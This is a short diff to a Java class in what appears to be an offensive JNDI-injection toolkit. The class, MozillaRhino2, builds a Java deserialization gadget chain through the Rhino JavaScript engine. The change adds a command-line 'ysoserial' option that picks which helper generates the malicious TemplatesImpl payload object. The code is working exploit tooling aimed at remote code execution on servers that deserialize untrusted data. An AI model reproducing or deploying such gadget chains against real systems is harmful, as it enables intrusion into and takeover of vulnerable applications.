@@ -4,6 +4,7 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import org.mozilla.javascript.*;
 import org.mozilla.javascript.tools.shell.Environment;
@@ -12,6 +13,8 @@ import java.io.ObjectOutputStream;
 import java.lang.reflect.Method;
 import java.util.Hashtable;
 import java.util.Map;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
  *     Works on rhino 1.6R6 and above & doesn't depend on BadAttributeValueExpException's readObject
@@ -78,7 +81,15 @@ public class MozillaRhino2 implements ObjectPayload<Object>{
 
         NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
         Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
-        Reflections.setFieldValue(nativeJavaArray, "javaObject", Gadgets.createTemplatesImpl(type,param));
+
+        final Object tpl;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            tpl = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            tpl = Gadgets.createTemplatesImpl(type, param);
+        }
+
+        Reflections.setFieldValue(nativeJavaArray, "javaObject", tpl);
         nativeJavaArray.setPrototype(scriptableObject);
         Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);
 
